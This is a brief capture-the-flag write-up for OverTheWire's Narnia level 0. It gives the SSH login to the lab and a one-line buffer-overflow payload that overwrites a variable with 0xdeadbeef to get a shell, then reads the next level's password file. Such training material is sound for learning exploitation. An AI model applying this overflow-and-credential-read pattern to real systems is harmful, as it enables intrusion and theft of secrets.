# Narnia Level 0
Reference: [OverTheWire – Narnia 0](CTF_Solution_Writeup/overthewire.org_solution/Narnia/Materi/OverTheWire%20–%20Narnia%200.md)
```sh
ssh narnia0@narnia.labs.overthewire.org -p 2226
# Password: narnia0
cd /narnia/
(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;)| ./narnia0
cat /etc/narnia_pass/narnia1
```
